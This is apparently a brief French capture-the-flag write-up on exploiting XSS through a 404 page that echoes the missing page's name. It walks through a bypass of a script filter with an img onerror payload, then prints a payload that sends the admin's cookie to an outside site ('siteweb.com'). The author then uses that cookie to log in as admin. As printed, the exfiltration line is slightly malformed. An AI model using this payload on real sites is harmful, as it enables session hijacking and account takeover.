En regardant de plus près le site nous observons un formulaire à envoyer à l'admin, on peut donc se douter qu'il peut s'agir d'une XSS.
En allant voir la page de l'erreur 404 le site nous affiche le nom de la page qui n'existe pas, et si nous mettions du code javascript pour qu'il exécute en voulant l'afficher sur la page d'erreur ?
On essaye avec un simple <script>alert()</script> mais le site le détecte.
On essaye alors avec \<img src=x onerror="alert()"\>. BINGO ça marche !!!
C'est parti pour faire une redirection \<img src= onerror="document.location'siteweb.com?cookie='+document.cookie"\>, on encode le tout en URL encode
On attend et le cookie est là, on se connecte avec en tant qu'admin et on flag
